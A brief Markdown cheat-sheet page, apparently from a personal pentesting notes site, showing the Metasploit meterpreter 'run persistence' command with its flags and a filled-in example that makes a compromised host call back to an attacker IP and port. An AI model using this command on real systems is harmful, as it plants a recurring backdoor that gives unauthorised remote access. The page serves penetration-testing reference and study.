---
layout: default
---
<< [Home](./)

# Metasploit Index
* [Persistence](#Persistence)

## Persistence<a name="Persistence"></a>

Run in meterpreter session:
```bash
run persistence -{U | X} -i [interval] -p [attacker_port] -r [attacker_ip]
```
Example:
```bash
run persistence -X -i 10 -p 4445 -r 192.168.1.10
```